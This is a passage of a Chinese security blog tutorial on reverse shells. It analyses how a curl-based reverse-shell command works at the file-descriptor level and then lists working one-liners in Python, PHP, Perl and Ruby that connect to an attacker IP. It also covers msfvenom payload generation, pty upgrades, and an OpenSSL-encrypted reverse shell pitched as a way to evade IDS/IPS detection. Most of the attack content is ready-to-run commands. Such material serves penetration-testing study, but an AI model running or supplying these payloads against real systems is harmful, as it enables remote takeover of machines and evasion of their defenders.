+<h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>为理解魔法命令，我们先对其进行语法分析。</p>
+<p>魔法命令被倒数第二个字符 <code>|</code> （管道）分为前后两部分，如下图所示。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br></code></pre></td></tr></table></figure>
+
+<p>前半部分是写在花括号中的命令组，命令组中包含由管道连接的两条命令，如下图所示。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                +-------+<br>                                |<span class="hljs-string">       </span>|<br>                                |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                |<span class="hljs-string">       </span>|<br>                                +-+---+-+<br>                                  |<span class="hljs-string">   </span>|<br>              +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>              |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>              |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>              +------+-----+                  +-------+<br>                     |<span class="hljs-string"></span><br><span class="hljs-string">              +------+-----+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<br>              |<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>              |<span class="hljs-string">            </span>|<br>              +---+---+----+<br>                  |<span class="hljs-string">   </span>|<br>                  |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">                                         </span>|<br>+-----------------+------------------------------+    +-----+----+<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>|<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>+------------------------------------------------+    +----------+<br></code></pre></td></tr></table></figure>
+
+<h3 id="fd-重定向分析"><a href="#fd-重定向分析" class="headerlink" title="fd 重定向分析"></a>fd 重定向分析</h3><p>完成语法分析后可对 fd 重定向情况进行分析。</p>
+<p>假设执行这条命令的 Bash 的 <code>stdin</code> 和 <code>stdout</code> 都是 <code>pts/0</code>。外层 <code>|</code>（倒数第二个字符）产生的匿名管道为 <code>pipe1</code>，内层 <code>|</code>（curl 和 sh 之间的管道）产生的匿名管道为 <code>pipe2</code>。</p>
+<p>可标注出外层 <code>|</code> 前后命令的 fd 如下图所示。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                              stdin : pipe1<br>                         stdout: pipe1                                              stdout: pts/0<br></code></pre></td></tr></table></figure>
+
+<p>命令组后的 <code>3&gt;&amp;1</code> 将 fd 3 重定向到了 fd 1，即 <code>stdout</code>，如下图所示。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                  +-------+<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  +-+---+-+<br>                                                                    |<span class="hljs-string">   </span>|<br>+------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                         stdin : pipe1<br>                         stdout: pipe1                                         stdout: pts/0<br>                         fd 3  : pipe1<br></code></pre></td></tr></table></figure>
+
+<p>命令组中的命令会继承 <code>&#123;&#125;</code> 的 fd，同时命令组中两条命令也由一个管道连接，综合这两点可标注出 curl 和 sh 的 fd 如下图所示。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+------------------------------+    +-----+----+<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> +------------------------------------------------+    +----------+<br><br>                 stdin : pts/0                         stdin : pipe2<br>                 stdout: pipe2                         stdout: pipe1<br>                 fd 3  : pipe1                         fd 3  : pipe1<br></code></pre></td></tr></table></figure>
+
+<p>curl 和 sh 各自又有一个重定向。curl 的 <code>&lt;/dev/fd/3</code> 表示把 <code>stdin</code> 重定向为 fd 3，即 <code>pipe1</code>。sh 的 <code>3&gt;&amp;-</code> 表示关闭 fd 3。考虑到这两个重定向，最后可得到下图。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+--------------------+              +-----+----+<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT  </span>|<span class="hljs-string">              </span>|<span class="hljs-string">    sh    </span>|<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> +--------------------------------------+              +----------+<br><br>                stdin : pipe1                          stdin : pipe2<br>                stdout: pipe2                          stdout: pipe1<br>                fd 3  : pipe1<br></code></pre></td></tr></table></figure>
+
+<p>从上图可以很清晰地看出，curl 的 <code>stdin</code> 和 sh 的 <code>stdout</code>、 sh 的 <code>stdin</code> 和 curl 的 <code>stdout</code> 分别通过匿名管道 <code>pipe1</code> 和 <code>pipe2</code> 相连。</p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>至此，我们已经基本弄清了魔法命令的工作原理，总结如下：利用 Bash 语法：命令组、管道和重定向等让 curl 命令和 sh 命令的 <code>stdin</code> 和 <code>stdout</code> 交错相连；又添加 <code>-T</code> 等参数和文件名 <code>.</code> 让 curl 读取 <code>stdin</code> 的内容发送到服务端，同时读取服务端返回的数据并输出到 <code>stdout</code>。</p>
+<h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><h4 id="为何要关闭-sh-命令的-fd-3？"><a href="#为何要关闭-sh-命令的-fd-3？" class="headerlink" title="为何要关闭 sh 命令的 fd 3？"></a>为何要关闭 sh 命令的 fd 3？</h4><p>测试发现其实不关闭 sh 命令的 fd 3 反弹 shell 也可以正常工作。</p>
+<h4 id="命令的作用是什么？"><a href="#命令的作用是什么？" class="headerlink" title=": 命令的作用是什么？"></a>: 命令的作用是什么？</h4><p>建立匿名管道 <code>pipe1</code>，且 <code>:</code> 命令不会去读 <code>pipe1</code>，不影响反弹 shell 工作。如果把 <code>:</code> 换成同样不会读 <code>stdin</code> 的 <code>true</code> 命令，反弹 shell 仍然可以工作，但如果换成会读 <code>stdin</code> 的命令如 <code>cat</code>，反弹 shell 就无法工作了。</p>
+<h2 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h2><h3 id="Python-脚本反弹shell"><a href="#Python-脚本反弹shell" class="headerlink" title="Python 脚本反弹shell"></a>Python 脚本反弹shell</h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="php-脚本反弹shell"><a href="#php-脚本反弹shell" class="headerlink" title="php 脚本反弹shell"></a>php 脚本反弹shell</h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a>Perl 脚本反弹shell</h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;47.101.57.72&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">2333</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">ruby -rsocket -e <span class="hljs-symbol">&#x27;c</span>=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br>或<br>ruby -rsocket -e <span class="hljs-symbol">&#x27;exit</span> <span class="hljs-keyword">if</span> fork;c=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p>
+<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">msfvenom -l payloads | grep <span class="hljs-symbol">&#x27;cmd</span>/unix/<span class="hljs-keyword">reverse</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>比如，我们获取一个python反弹shell的一句话：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=47.xxx.xxx.72 <span class="hljs-attribute">LPORT</span>=2333 -f raw<br></code></pre></td></tr></table></figure>
+
+<p>将生成的python反弹shell的一句话在目标主机上执行即可</p>
+<h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
+<ul>
+<li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li>
+<li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li>
+<li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li>
+</ul>
+<p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p>
+<p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>
+<h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p>
+<blockquote>
+<p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p>
+</blockquote>
+<p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x509 -newkey rsa:<span class="hljs-number">2048</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure>
+
+<p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p>
+<h3 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h3><p>实验环境：Linux</p>
+<p>目标机：</p>
+<ul>
+<li>系统：Linux</li>
+<li>IP：192.168.1.8</li>
+</ul>
+<p>攻击机：</p>
+<ul>
+<li>系统：Linux</li>
+<li>IP：47.xxx.xxx.72</li>
+</ul>
+<p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem -cert cert.pem -port <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>
+
+<p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p>
+<p>这时在目标机进行反弹 shell 操作，命令为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; <span class="hljs-built_in">rm</span> /tmp/s<br></code></pre></td></tr></table></figure>
+
+<p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>反弹shell</div>
+      <div>http://example.com/2023/10/28/反弹shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Whhxy4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/28/PHP_tricks/" title="PHP tricks">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP tricks</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/" title="DASCTF X CBCTF 2023｜无畏者先行">
+                        <span class="hidden-mobile">DASCTF X CBCTF 2023｜无畏者先行</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
